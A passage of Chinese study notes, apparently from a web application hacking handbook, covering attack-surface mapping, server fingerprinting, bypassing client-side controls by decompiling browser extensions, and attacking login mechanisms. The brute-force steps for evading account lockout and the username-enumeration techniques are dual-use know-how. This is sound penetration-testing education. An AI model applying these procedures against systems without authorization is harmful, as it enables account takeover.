<li>使用常见参数和常用值，提交大量请求；</li>
<li>监控收到的全部响应，看增加的额外参数有没有让应用程序作出不一样的响应行为；</li>
<li>如果时间允许，可以对所有页面都执行以上动作；如果时间不允许，可以只测试一些重点的页面，例如登录、搜索、文件的上传和下载等；</li>
</ul>
<h2 id="分析应用程序"><a href="#分析应用程序" class="headerlink" title="分析应用程序"></a>分析应用程序</h2><p>在枚举完尽可能多的功能后，接下来是基于收集到的数据，进一步分析应用程序，以找到它的攻击面；值得分析的一些重要部分如下：</p>
<ul>
<li>应用程序的核心功能；</li>
<li>应用程序的外围功能，例如错误消息、日志、重定向使用、站外链接等；</li>
<li>核心安全机制及其动作方式，特别是会话状态、访问控制、验证机制及其支持（例如用户注册、忘记密码、账户恢复等）；</li>
<li>应用程序处理用户提交的输入的所有位置，例如 URL、查询字符串、POST 数据等；</li>
<li>客户端使用的技术，例如表单、客户端脚本、厚客户端组件等；</li>
<li>服务端使用的技术，例如静态与动态页面、请求参数类型、SSL、Web服务器软件、数据库交互、电子邮件系统等后端组件；</li>
<li>其他任何可收集到的，关于服务器应用程序内部结构与功能的其他信息，例如后台传输机制等；</li>
</ul>
<h3 id="确定用户输入的入口点"><a href="#确定用户输入的入口点" class="headerlink" title="确定用户输入的入口点"></a>确定用户输入的入口点</h3><p>输入的常见位置如下：</p>
<ul>
<li>每个 URL 字符串，例如：REST 风格的应用程序；</li>
<li>URL 查询字符串中提交的每个参数；</li>
<li>POST 请求主体中提交的每个参数；</li>
<li>每个 cookie 的键值对；</li>
<li>极少数情况下还包括消息头中的一些字段，例如  User-Agent、Referer、Accept、Accept-Language、Host等；</li>
</ul>
<h4 id="URL-文件路径"><a href="#URL-文件路径" class="headerlink" title="URL 文件路径"></a>URL 文件路径</h4><p>此时的输入体现在 REST 风格的路径中，至于命名是否有统一的标准，主要取决于开发者；</p>
<h4 id="请求参数"><a href="#请求参数" class="headerlink" title="请求参数"></a>请求参数</h4><p>一般来说，在查询字符串的请求参数、POST 参数和 cookie 键值对中，都含有明显的输入，但是它们的格式不一定是标准的 key&#x3D;value 格式，有些开发者会使用一些定制的模式，需要加以留意一下；</p>
<h4 id="HTTP-消息头-1"><a href="#HTTP-消息头-1" class="headerlink" title="HTTP 消息头"></a>HTTP 消息头</h4><p>很多应用程序会使用日志的功能，会去读取 Referer 和 User-Agent 字段里面的值，因此这些消息头也有可能成为入口点；</p>
<p>有些应用程序还会处理消息头里面的值，记录和提取关于用户的一些信息，然后做出不同的响应；例如根据用户访问使用的不同设备、根据 IP 进行定位等；</p>
<p>应用程序的这些功能都增加了 SQL 注入或持续的跨站点脚本等攻击；</p>
<h4 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h4><p>在探测的过程中，服务端的结果有时并一定会通过响应进行返回，此时就需要有额外的通道能够查询到这些响应；</p>
<h3 id="确定服务器端技术"><a href="#确定服务器端技术" class="headerlink" title="确定服务器端技术"></a>确定服务器端技术</h3><h4 id="提取版本信息"><a href="#提取版本信息" class="headerlink" title="提取版本信息"></a>提取版本信息</h4><p>例如响应中的 Server 消息头；其他可能揭露服务相关软件信息的有</p>
<ul>
<li>建立 HTML 页面的模板；</li>
<li>定制的 HTTP 消息头；</li>
<li>URL 查询字符串参数；</li>
</ul>
<h4 id="HTTP-指纹识别"><a href="#HTTP-指纹识别" class="headerlink" title="HTTP 指纹识别"></a>HTTP 指纹识别</h4><p>虽然服务端可能会在 Server 消息头中对自己的身份进行伪造，但是应用程序中仍然会有很多蛛丝马迹可以用来推测服务端会使用的软件，也有相应的工具，例如 httprecon 等；</p>
<h4 id="文件扩展名"><a href="#文件扩展名" class="headerlink" title="文件扩展名"></a>文件扩展名</h4><p>常用的文件扩展名</p>
<ul>
<li>asp: Microsoft Active Server Pages;</li>
<li>aspx: ASP.NET</li>
<li>jsp: Java</li>
<li>php: PHP</li>
</ul>
<p>即使页面没有体现出扩展名，也可以通过请求一个不存在的文件，从返回的错误页面也可能可以得到相关信息；</p>
<h4 id="目录名称"><a href="#目录名称" class="headerlink" title="目录名称"></a>目录名称</h4><p>一些子目录名称也可用来确认是否使用相关技术；</p>
<ul>
<li>servlet：Java servlet；</li>
<li>pls: Oracle PL&#x2F;SQL 网关</li>
<li>rails: Ruby on Rails</li>
</ul>
<h4 id="会话令牌"><a href="#会话令牌" class="headerlink" title="会话令牌"></a>会话令牌</h4><p>会话令牌的名称也会揭示信息</p>
<ul>
<li>JESSIONID: Java</li>
<li>ASPSESSIONID: Microsoft IIS 服务器</li>
<li>ASP.NET_SessionId： ASP.NET</li>
<li>PHPSESSID: PHP</li>
</ul>
<h4 id="第三方代码组件"><a href="#第三方代码组件" class="headerlink" title="第三方代码组件"></a>第三方代码组件</h4><p>很多应用程序会整合一些第三方代码组件来执行一些常见的功能，例如购物车、登录机制等；这些组件可能为开源代码，或者从其他公司购买来的，不管是哪一种，都意味着这些组件会被很多人使用；</p>
<p>因此，软件中很可能包含其他地方已经揭示的某些已知漏洞，攻击者还可以下载这些组件的开源代码进行分析，在找到可能的漏洞；</p>
<h5 id="渗透测试步骤-5"><a href="#渗透测试步骤-5" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>确定全部用户输入入口点；</li>
<li>分析应用程序所使用的查询字符串格式，设法了解键值对的名称规律；</li>
<li>确定应用程序可能使用的一些第三方数据的带外通道；</li>
<li>查看响应中的 Server 属性；</li>
<li>检查所有 HTTP 消息头或 HTML 注释中包含的其他软件标识；</li>
<li>运行 Httprecon 工具来识别服务器；</li>
<li>如果获得了 Web 服务器软件名称和版本，则可以搜索可供利用的所有漏洞；</li>
<li>分析应用程序的 URL 列表，从扩展名和子目录名中查找线索；</li>
<li>分析会话令牌的名称；</li>
<li>使用常用技术列表或 Google 推测服务器所使用的技术；</li>
<li>在 Google 上搜索第三方组件可能使用的不常用的 cookie、脚本、HTTP 消息头名称；确定所使用的是哪种第三方组件，下载安装组件，分析其中可能存在的漏洞；</li>
</ul>
<h3 id="确定服务器端功能"><a href="#确定服务器端功能" class="headerlink" title="确定服务器端功能"></a>确定服务器端功能</h3><h4 id="仔细分析请求"><a href="#仔细分析请求" class="headerlink" title="仔细分析请求"></a>仔细分析请求</h4><p>请求中的各种参数暗含着很多信息量，包括资源的类型、可执行的操作、资源的编号、是否使用数据库、服务器的语言框架等；</p>
<h4 id="推测应用程序的行为"><a href="#推测应用程序的行为" class="headerlink" title="推测应用程序的行为"></a>推测应用程序的行为</h4><p>应用程序可能会执行某种输入确认检查，以净化可能存在的恶意输入；如果它有将错误揭示反馈到浏览器，则可以用来判断应该提交哪些输入，才有可能通过检查，之后设计特定字符串来规避检查；</p>
<h4 id="隔离独特的应用程序行为"><a href="#隔离独特的应用程序行为" class="headerlink" title="隔离独特的应用程序行为"></a>隔离独特的应用程序行为</h4><p>有时，许多可靠的应用程序会使用一致的框架来防范各种类型的攻击，此时薄弱点经常出现在开发人员后续添加的而常规安全框架没有处理的那些功能；一般来说，通过 GUI 外观、参数命名约定，或者源代码中的注释，即可找出这些拼接的功能；</p>
<h5 id="渗透测试步骤-6"><a href="#渗透测试步骤-6" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>记录其使用的标准 GUI 外观、参数命名或导航机制与应用程序的其他部分不同的任何功能；</li>
<li>记录可能在后续添加的功能，包括调试功能、CAPTCHA 控件、使用情况跟踪和第三方代码等；</li>
<li>对这些区域进行全面检查，这些区域很可能没有其他区域实施的标准防御机制；</li>
</ul>
<h4 id="解析受攻击面"><a href="#解析受攻击面" class="headerlink" title="解析受攻击面"></a>解析受攻击面</h4><p>常用的易受攻击的漏洞：</p>
<ul>
<li>客户端确认：服务器没有采用确认检查；</li>
<li>数据库交互：SQL 注入；</li>
<li>文件上传与下载：路径遍历漏洞、保存型跨站点脚本；</li>
<li>显示用户提交的数据：跨站点脚本；</li>
<li>动态重定向：重定向与消息头注入攻击；</li>
<li>社交网络功能：用户名枚举、保存型跨站点脚本；</li>
<li>登录：用户名枚举、脆弱密码、可使用蛮力；</li>
<li>多阶段登录：登录缺陷；</li>
<li>会话状态：可推测出的令牌、令牌处理不安全；</li>
<li>访问控制：水平权限和垂直权限提升；</li>
<li>用户伪装功能：权限提升；</li>
<li>使用明文通信：会话劫持、收集证书和其他敏感数据；</li>
<li>站外链接：Referer 消息头中查询字符串参数泄露；</li>
<li>外部系统接口：处理会话与访问控制的快捷方式；</li>
<li>错误消息：令牌泄露；</li>
<li>电子邮件交互：电子邮件与命令注入；</li>
<li>本地代码组件或交互：缓冲区溢出；</li>
<li>使用第三方应用程序组件：已知漏洞；</li>
<li>已确认的Web 服务器软件：常见配置薄弱环节、已知软件程序缺陷；</li>
</ul>
<h4 id="解析-EIS-应用程序"><a href="#解析-EIS-应用程序" class="headerlink" title="解析 EIS 应用程序"></a>解析 EIS 应用程序</h4><ul>
<li>了解应用程序的核心功能和使用的主要安全机制；</li>
<li>确定通常与常见漏洞有关的应用程序功能和行为特点；</li>
<li>在公共漏洞数据库（如 <a target="_blank" rel="noopener" href="http://www.osvdb.org)中检查任何第三方代码,以确定任何已知问题;/">www.osvdb.org）中检查任何第三方代码，以确定任何已知问题；</a></li>
<li>制订攻击计划，优先考虑最可能包含漏洞的功能，以及最严重的漏洞；</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>虽然直接发动攻击显得很有吸引力，但在行动之前，先做一番分析的工作，将使得攻击的效率大大提高；一般来说，在采用手动技巧的同时，适当的采用自动化工具，是最有效的攻击手段；</p>
<h1 id="5-避开客户端控件"><a href="#5-避开客户端控件" class="headerlink" title="5. 避开客户端控件"></a>5. 避开客户端控件</h1><h2 id="通过客户端传送数据"><a href="#通过客户端传送数据" class="headerlink" title="通过客户端传送数据"></a>通过客户端传送数据</h2><p>一般来说如果将会话数据放在服务器端，安全性更高一些，但是当在很多台服务器同时部署应用程序时，解决它们之间的数据同步将是一个挑战，因此有时候开发人员会将会话数据前移到客户端，这样确实让事情变得简单了，但是却增加了风险；</p>
<h3 id="隐藏表单字段"><a href="#隐藏表单字段" class="headerlink" title="隐藏表单字段"></a>隐藏表单字段</h3><p>应用程序将部分信息保存在隐藏的表单字段中，之后和用户填写的其他表单字段一起提交；</p>
<h3 id="HTTP-cookie"><a href="#HTTP-cookie" class="headerlink" title="HTTP cookie"></a>HTTP cookie</h3><p>应用程序将信息保存在 cookie 的键值对中，之后在客户端发起请求时，一起发到服务端；</p>
<h3 id="URL-参数"><a href="#URL-参数" class="headerlink" title="URL 参数"></a>URL 参数</h3><p>将参数保存在 URL 中是最容易被用户修改的情况了；</p>
<h3 id="Referer-消息头"><a href="#Referer-消息头" class="headerlink" title="Referer 消息头"></a>Referer 消息头</h3><p>有些开发者使用这个字段来判断某个请求是由哪个 URL 触发的；</p>
<h3 id="模糊数据"><a href="#模糊数据" class="headerlink" title="模糊数据"></a>模糊数据</h3><p>有时候服务端发到客户端的数据并不是明文的，而是经过了一定的模糊化处理，然后等客户端提交回服务端时，再解密去模糊；</p>
<h3 id="ASP-NET-ViewState"><a href="#ASP-NET-ViewState" class="headerlink" title="ASP.NET ViewState"></a>ASP.NET ViewState</h3><p>它是一种通过客户端传送模糊数据的常用机制，使用一些隐藏的字段保存一些序列化后的数据；</p>
<p>但是 ASP.NET 默认会开启对 ViewState 字段的保护，通过加盐进行散列化，用来防止客户端的窜改，但有些应用程序会将保护关掉，这个时候就会产生漏洞了；一个页面开启保护，不代表所有页面都开启，因此需要逐一排查；</p>
<h2 id="收集用户数据：HTML-表单"><a href="#收集用户数据：HTML-表单" class="headerlink" title="收集用户数据：HTML 表单"></a>收集用户数据：HTML 表单</h2><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p>这个可以轻意绕过，只能用来限制非专业的用户；可以故意给相关的字段设置一个超过长度的值，然后看服务端是否有所反应，如果能够通过验证，则说明服务器端没有再做一次验证，存在漏洞；</p>
<h3 id="基于脚本的确认"><a href="#基于脚本的确认" class="headerlink" title="基于脚本的确认"></a>基于脚本的确认</h3><p>跟前面的长度限制一样，略；</p>
<h3 id="禁用的元素"><a href="#禁用的元素" class="headerlink" title="禁用的元素"></a>禁用的元素</h3><p>浏览器在提交请求时，并不会包含禁用的元素，因此仅仅观察发出的请求是无法找到这些元素的；但在查看页面源代码或者服务器的响应时，就会发现它们；</p>
<h2 id="收集用户数据：浏览器扩展"><a href="#收集用户数据：浏览器扩展" class="headerlink" title="收集用户数据：浏览器扩展"></a>收集用户数据：浏览器扩展</h2><p>相对于 HTML 表单和 Javascript 脚本，使用浏览器扩展相对更不透明一些，这让开发人员有一种错觉，即扩展更加安全，但其实并非如此，通过检查扩展的漏洞经常可以收获很大；</p>
<h3 id="常见的浏览器扩展技术"><a href="#常见的浏览器扩展技术" class="headerlink" title="常见的浏览器扩展技术"></a>常见的浏览器扩展技术</h3><ul>
<li>Java applet</li>
<li>Flash</li>
<li>Silverlight</li>
</ul>
<p>它们有一些共同点，例如都编译成字节码、在提供沙盒环境的虚拟机中运行、可以使用远程框架，通过序列化来传输复杂的数据结构；</p>
<h3 id="攻击浏览器扩展的方法"><a href="#攻击浏览器扩展的方法" class="headerlink" title="攻击浏览器扩展的方法"></a>攻击浏览器扩展的方法</h3><ul>
<li>拦截并修改浏览器扩展提出的请求及服务器的响应；</li>
<li>直接针对组件实施攻击，并尝试反编译它的字节码，以查看它的源代码；</li>
</ul>
<h3 id="拦截浏览器扩展的流量"><a href="#拦截浏览器扩展的流量" class="headerlink" title="拦截浏览器扩展的流量"></a>拦截浏览器扩展的流量</h3><p>如果扩展是明文传输数据，则简单好办，但有时候并非如此，以下是一些常见的问题：</p>
<h4 id="处理序列化数据"><a href="#处理序列化数据" class="headerlink" title="处理序列化数据"></a>处理序列化数据</h4><p>一般来说，每种浏览器扩展都会有一套序列化的方案，研究这些方案的特点，有针对性的进行解析处理；</p>
<h5 id="Java-序列化"><a href="#Java-序列化" class="headerlink" title="Java 序列化"></a>Java 序列化</h5><p>它会在在 Content-Type 里面体现为 application&#x2F;x-java-serialized-object, Burp Suite 中有一个插件 Dser 可用来查看拦截的序列化 Java 对象；</p>
<h5 id="Flash-序列化"><a href="#Flash-序列化" class="headerlink" title="Flash 序列化"></a>Flash 序列化</h5><p>Content-Type: application&#x2F;x-amf</p>
<h5 id="Silverlight-序列化"><a href="#Silverlight-序列化" class="headerlink" title="Silverlight 序列化"></a>Silverlight 序列化</h5><p>Content-Type: application&#x2F;soap+msbin1</p>
<h4 id="拦截浏览器扩展流量时遇到的障碍"><a href="#拦截浏览器扩展流量时遇到的障碍" class="headerlink" title="拦截浏览器扩展流量时遇到的障碍"></a>拦截浏览器扩展流量时遇到的障碍</h4><h5 id="问题1：扩展没有执行在浏览器中设置的代理"><a href="#问题1：扩展没有执行在浏览器中设置的代理" class="headerlink" title="问题1：扩展没有执行在浏览器中设置的代理"></a>问题1：扩展没有执行在浏览器中设置的代理</h5><p>原因在于客户端组件没有使用浏览器的 API 来发出 HTTP 请求，此时可以通过修改 hosts 文件来达到拦截目的，同时将代理服务器配置为劫持匿名代理，并自动重定向的正确的目标主机；</p>
<h5 id="问题2：扩展可能不接受拦截代理器提供的-SSL-证书"><a href="#问题2：扩展可能不接受拦截代理器提供的-SSL-证书" class="headerlink" title="问题2：扩展可能不接受拦截代理器提供的 SSL 证书"></a>问题2：扩展可能不接受拦截代理器提供的 SSL 证书</h5><p>原因在于组件配置为不接受自签名的证书，或者组件本身的编码要求拒绝不可信的证书，此时可以通过在机器上面安装一个 CA 证书，并将代理服务器配置为使用该证书；</p>
<h5 id="问题3：扩展使用除-HTTP-以外的协议进行通信"><a href="#问题3：扩展使用除-HTTP-以外的协议进行通信" class="headerlink" title="问题3：扩展使用除 HTTP 以外的协议进行通信"></a>问题3：扩展使用除 HTTP 以外的协议进行通信</h5><p>原因在于拦截代理服务器可能无法处理这些协议；使用网络嗅探器例如 Echo Mirage 来修改相关流量，它通过注入进程并拦截套按字 API 调用来实现查看和修改数据的目的；</p>
<h5 id="渗透测试步骤-7"><a href="#渗透测试步骤-7" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>确保代理服务器能够正确拦截浏览器扩展发出的所有流量；如有必要，使用嗅探器确定任何未正确拦截的流量；</li>
<li>如果扩展使用标准的序列化框架，确保拥有解压并修改序列化数据所需的工具；如果扩展使用专用编码或加密机制，则需要调试组件，对其进行全面测试；</li>
<li>检查服务器返回的能够触发客户端关键步骤的响应；一般来说，通过修改这个响应，能够解锁客户端的GUI，从而发现并执行那些复杂或多步骤的操作；</li>
<li>如果一些关键步骤（如赌博应用中的发牌动作）不是由客户端执行，而是由服务端执行，则尝试寻找执行该步骤和服务端通信之间的联系</li>
</ul>
<h4 id="反编译浏览器扩展"><a href="#反编译浏览器扩展" class="headerlink" title="反编译浏览器扩展"></a>反编译浏览器扩展</h4><p>在应对浏览器扩展时，对其进行反编译是最彻底的方法；一般来说，根据各自语言的特性，组件是以字节码的形式存在的，有时还会有反编码的防御机制，尽管如此，仍然是很有可能破解的；</p>
<h5 id="下载字节码"><a href="#下载字节码" class="headerlink" title="下载字节码"></a>下载字节码</h5><p>一般来说，字节码通过页面源文件中的 <applet> 或 <object> 标签进行加载，里面有供下载的 URL；有时是通过脚本进行加载，此时可以等页面加载完毕后，再查看代理服务器的历史记录中的 URL；</p>
<blockquote>
<p>由于字节码在加载后会被缓存，因为有时需要通过清理缓存来触发再次加载；另外拦截器有时会隐藏一些它认为不重要的信息，此时需要全部显示出来才找得到；</p>
</blockquote>
<h5 id="反编译字节码"><a href="#反编译字节码" class="headerlink" title="反编译字节码"></a>反编译字节码</h5><p>字节码经常以压缩包的形式被下载，因此需要先进行解压缩；Java 的 jar 包，Silverlight 的 .xap 文件，都是使用 zip 格式压缩的，此时只需给文件增加 zip 的后缀，即可以使用 zip 软件进行解压缩；</p>
<p>常用的反编译工具</p>
<ul>
<li>Java：Jad</li>
<li>Flash：Flasm，Flare，SWFScan；</li>
<li>Silverlight：NET Reflector；</li>
</ul>
<h5 id="分析源代码"><a href="#分析源代码" class="headerlink" title="分析源代码"></a>分析源代码</h5><h6 id="重点分析的事项："><a href="#重点分析的事项：" class="headerlink" title="重点分析的事项："></a>重点分析的事项：</h6><ul>
<li>客户端输入确认或其他与安全相关的逻辑和事件；</li>
<li>在提交数据到服务端前，对数据进行加密或者模糊的函数；</li>
<li>在用户界面中看不到，但可以使用的隐藏功能；</li>
<li>在解析服务端时没发现，但在组件中引用的服务端功能；</li>
</ul>
<h6 id="修改组件行为的方法"><a href="#修改组件行为的方法" class="headerlink" title="修改组件行为的方法"></a>修改组件行为的方法</h6><ul>
<li>修改源代码后，重新编译为字节码，清理缓存，重新下载字节码，之后用拦截器进行替换；</li>
<li>修改源代码后，重新编译为字节码，使用它计算出结果，导出到本地，用代理服务器将该结果提交到服务器；</li>
</ul>
<h6 id="使用-Javascript-操纵原始组件"><a href="#使用-Javascript-操纵原始组件" class="headerlink" title="使用 Javascript 操纵原始组件"></a>使用 Javascript 操纵原始组件</h6><p>有时并不需要修改组件的字节码，而是基于组件的方法可能会被 javascript 调用，然后返回处理结果；此时，只需要修改 javascript 就可以实现修改结果的目的；</p>
<blockquote>
<h5 id="渗透测试步骤-8"><a href="#渗透测试步骤-8" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>下载、解压字节码，反编译成源代码；</li>
<li>查看源代码，了解组件的工作过程；</li>
<li>如果组件包含公共的方法，拦截与该组件交互的 HTML 响应，添加或修改 Javacript，获取想要的结果；</li>
<li>如果组件不包含公共的方法，修改组件的源代码，重新编译为字节码，独立执行这些字节码，获取想要的结果；</li>
<li>如果组件负责向服务端提交模糊或加密的数据，则可以设计一些特定的字符串，通过组件提交，用来探查服务端可能存在的漏洞；</li>
</ul>
</blockquote>
<h5 id="字节码模糊处理"><a href="#字节码模糊处理" class="headerlink" title="字节码模糊处理"></a>字节码模糊处理</h5><p>为了应对反编译，人们会使用一些模糊技巧，让反编译后的结果难以被理解，或者增加理解的难度；常用的反编译技巧如下：</p>
<ul>
<li>用没有意义的表达式替代有意义的类、方法、成员变量名称；</li>
<li>用保留的关键字替换项目名称；</li>
<li>删除字节码中不必要的调试和元信息，例如源文件名、行号、局部变量名、内部类信息；</li>
<li>增加多余的代码；</li>
<li>使用跳转指令对整个代码的执行路径进行修改，令人难以理解和判断执行代码的逻辑顺序；</li>
<li>在字节码中引入非法代码，如果不清除这些非法代码，则无法重新编译；</li>
</ul>
<blockquote>
<h5 id="渗透测试步骤-9"><a href="#渗透测试步骤-9" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>不必完全理解源代码，只需确定是否包含公共方法，以及哪些方法可以从 javascript 进行调用，它们的签名是什么；</li>
<li>如果使用了无意义的表达式，则可以使用 IDE 内置的重构功能（如 rename），为其分配有意义的名称；</li>
<li>对已经模糊处理过的字节码，使用模糊处理工具，再次对其进行模糊处理，这样可以撤销许多模糊处理，例如 Jode 工具，它可用来删除由其他模糊处理工具添加的多余代码，并为数据分配唯一的名称，为理解模糊后的结果提供线索；</li>
</ul>
</blockquote>
<h4 id="附加调试器"><a href="#附加调试器" class="headerlink" title="附加调试器"></a>附加调试器</h4><p>有时组件很大，代码很多行，阅读它们很费时间，此时可考虑使用另外一种方法，即调试器；由于组件是在字节码级别运行的，因此用调试器在运行过程中跟踪变量，加入断点，查看和修改参数或变量，获取想要的结果，例如 javaSnoop；</p>
<h4 id="本地客户端组件"><a href="#本地客户端组件" class="headerlink" title="本地客户端组件"></a>本地客户端组件</h4><p>本地客户端组件不是基于字节码来运行，而是基于机器语言和汇编，因此它们的反编译工作稍微复杂一些（即逆向工程领域），不过原理仍然是一样的，即使用调试工具和添加断点，来分析程序的行为规律；</p>
<p>常用工具有：OllyDbg，IDA Pro等；</p>
<h2 id="安全处理客户端数据"><a href="#安全处理客户端数据" class="headerlink" title="安全处理客户端数据"></a>安全处理客户端数据</h2><h3 id="通过客户端传送数据-1"><a href="#通过客户端传送数据-1" class="headerlink" title="通过客户端传送数据"></a>通过客户端传送数据</h3><p>理论上，所有的数据服务端都是有的，因此，应该尽可能避免将敏感数据交给客户端提交，因为客户端是不可控的；</p>
<p>如果实在迫不得已，则应该将敏感数据和其他数据进行组合，然后加密，再发送到客户端，而不能仅单独加密敏感数据；</p>
<h3 id="确认客户端生成的数据"><a href="#确认客户端生成的数据" class="headerlink" title="确认客户端生成的数据"></a>确认客户端生成的数据</h3><p>由于客户端被用户完全控制，因此在客户端对数据进行确认在理论上是几乎不可能的，只是难度大小的区别而已；</p>
<p>唯一安全的方法是永远不信任客户端，对客户端提交的每一项数据，都进行确认和验证；</p>
<h3 id="日志与警报"><a href="#日志与警报" class="headerlink" title="日志与警报"></a>日志与警报</h3><p>服务端有必要增加警报机制，在收到非法数据后，记录到日志中，向应用程序管理员发出警报，以便其能够监控攻击企图；同时应用程序还应该主动采取防御措施，终止用户会话或者暂时冻结其账户；</p>
<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>永远不要相信客户端的输入；</p>
<h1 id="6-攻击验证机制"><a href="#6-攻击验证机制" class="headerlink" title="6. 攻击验证机制"></a>6. 攻击验证机制</h1><h2 id="验证技术"><a href="#验证技术" class="headerlink" title="验证技术"></a>验证技术</h2><p>常用的验证技术</p>
<ul>
<li>基于 HTML 表单的验证</li>
<li>多元机制，如密码+物理令牌；</li>
<li>客户端 SSL 证书或智能卡；</li>
<li>HTTP 基本和摘要验证；</li>
<li>使用 NTLM 或 Kerberos 整合 Windows 验证；</li>
<li>第三方验证服务</li>
</ul>
<h2 id="验证机制设计缺陷"><a href="#验证机制设计缺陷" class="headerlink" title="验证机制设计缺陷"></a>验证机制设计缺陷</h2><h3 id="密码保密性不强"><a href="#密码保密性不强" class="headerlink" title="密码保密性不强"></a>密码保密性不强</h3><p>主要源于没有控制密码的强度；例如：</p>
<ul>
<li>非常短或空白的密码；</li>
<li>以常用的字典词汇或名称为密码；</li>
<li>密码和用户名完全相同；</li>
<li>仍然使用默认密码；</li>
</ul>
<h4 id="渗透测试步骤-10"><a href="#渗透测试步骤-10" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>设法查明任何与密码强度有关的规则</li>
<li>浏览站点，查找规则的描述；</li>
<li>如果可以自行注册，用不同种类的脆弱密码注册一下，了解规则；</li>
<li>如果已经有账户，尝试把密码更改为弱密码；</li>
</ul>
<h3 id="蛮力攻击登录"><a href="#蛮力攻击登录" class="headerlink" title="蛮力攻击登录"></a>蛮力攻击登录</h3><p>如果应用程序没有限制用户尝试的次数，则攻击者很容易就会使用蛮力攻击，因为有太多知名站点的沦陷，导致大量的用户密码泄露，它们都可以作为很好的密码库进行暴力尝试；</p>
<blockquote>
<p>管理员密码经常更加脆弱，因为它常常是在应用程序上线之前就已经设置好的，因此经常没有遵守规则；</p>
</blockquote>
<p>有些应用程序会在客户端使用隐藏字段记录尝试失败的次数，然后提交到服务器进行限制，但这种方法太容易被绕开；如果失败次数保留在服务端，也可以通过新开一个会话来绕过这个限制；</p>
<p>有些应用程序会在失败一定次数后锁定账户，让其不能登录，但是它可能仍然对后续的尝试做出正确与否的响应，此时攻击者只要不断尝试，直到找到正确的密码，然后等到解锁的时候，即可登录；</p>
<blockquote>
<h4 id="渗透测试步骤-11"><a href="#渗透测试步骤-11" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>用某个受控账户手动提交几个错误的登录尝试，监控接收到的错误消息；</li>
<li>如果在10次登录失败后，还没有返回锁定消息，再尝试正确的密码，如果登录成功，则说明应用程序并没有采取任何账户锁定策略；</li>
<li>如果账户被锁定，可以尝试使用不同的账户；</li>
<li>如果应用程序发布 cookie，则设置让每个 cookie 只使用一次，之后每次登录尝试获取新 cookie；</li>
<li>如果账户被锁定，应该查看与提交无效密码相比，提交正确密码是否会在响应中存在差异；如果是的话，则即使账户被锁定，仍然可以继续猜测攻击；</li>
<li>如果没有受控账户，尝试枚举一个有效的用户名，并使用它提交几次错误登录，监控账户的错误消息；</li>
<li>发动蛮力攻击前，应先确定好应用程序在成功与失败两种响应的差异，以便分清区别；</li>
<li>列出常见的用户名和密码列表，根据已知的密码规则对其进行过滤，只留下有效的密码，避免无谓的多余尝试；</li>
<li>使用这些用户名和密码的排列组合，使用适当的工具或定制脚本迅速生成登录请求，监控服务器的响应，筛选出那些成功的登录尝试；</li>
<li>如果一次针对几个用户名，最好使用广度优先，而不是深度优先，每个用户名只尝试一次密码，然后轮下一个用户名，这样避免触发单个用户名的失败次数过多的锁定；</li>
</ul>
</blockquote>
<h3 id="详细的失败消息"><a href="#详细的失败消息" class="headerlink" title="详细的失败消息"></a>详细的失败消息</h3><p>失败消息中，有时候会注明是哪一项登录消息无效，例如用户名或者密码，此时就可以利用这个信息，筛选出有效的用户名，供下一轮攻击时使用；</p>
<p>如果应用程序允许用户自行注册并指定自己的用户名，由于应用程序需要排查用户名是否重复，因此攻击者可以利用这一点进行用户名枚举，筛选出有效的用户名；</p>
<p>有些应用程序的登录比较复杂，需要用户提交几组信息，或者分几个步骤，此时详细的失败信息有助于攻击者轮流针对登录过程的每个阶段发动攻击；</p>
<p>同样的用户名错误，页面上可能看起来没有差别，但在 HTML 源代码中可能会有区别，通过“比较”工具找出区别，就可以收获有效的信息；</p>
<blockquote>
<h4 id="渗透测试步骤-12"><a href="#渗透测试步骤-12" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果已经有一个受控账户，使用这个账户的用户名和一个错误的密码登录一次，然后使用完全随机的用户名进行另一次登录；</li>
<li>记录两次登录服务器响应中的每一个细节，包括状态码、重定向、屏幕上显示的信息、页面源代码的差异；使用拦截器保存请求和响应的完整历史记录；</li>
<li>努力找出两次尝试间的任何明显或细微的差异；</li>
<li>如果找不到差异，在应用程序中任何提交用户名的地方重复上述操作，例如注册、密码修改、忘记密码等功能；</li>
<li>如果发现有差异，使用一个常见的用户名列表，用自动工具迅速提交每个用户名，根据响应的差异，筛选出有效的用户名；</li>
<li>开始枚举之前，确定应用程序是否有失败次数达到上限后的锁定策略；如果有，则不应该在枚举时使用不合理的密码，而应提交常见的密码；</li>
</ul>
</blockquote>
<p>即使服务端对有效用户名和无效用户名返回的响应完全相同，它的处理时间也经常是不同的，即有效用户名处理的步骤可能要久一些，而无效用户名要短一些；这种判断方法不一定百分百准确，但从大数来说，有一定的准确概率；</p>
<blockquote>
<p>除了登录功能外，还可以从其他地方获取有效的用户名，例如源代码注释、开发人员的电子邮件、可访问的日志等；</p>
</blockquote>
<h3 id="密码传输易受攻击"><a href="#密码传输易受攻击" class="headerlink" title="密码传输易受攻击"></a>密码传输易受攻击</h3><p>如果应用程序使用非加密的 HTTP 连接传输登录密码，处于网络中适当位置的窃听者就有机会能够拦截这些密码；可能窃听的位置有：</p>
<ul>
<li>用户的本地网络中；</li>
<li>用户的 IT 部门中；</li>
<li>用户的 ISP 内；</li>
<li>因特网骨干网上；</li>
<li>托管应用程序的 ISP 内；</li>
<li>管理应用的 IT 部门内；</li>
</ul>
<p>即使通过 HTTPS 登录，应用程序也有可能使用不安全的方式来处理密码，导致密码可能被泄露：</p>
<ul>
<li>以查询字符串而不是 POST 请求主体中传送密码；这样会导致很多地方都会记录这些信息，例如用户的浏览历史记录、Web服务器日志内、主机基础架构使用的任何反向代理中；如果攻击者能够攻击这些资源，就有机会获得密码；</li>
<li>虽然多数应用开发者使用 POST 提交表单，但登录请求却经常使用 302 重定向到一个不同的 URL 来进行；</li>
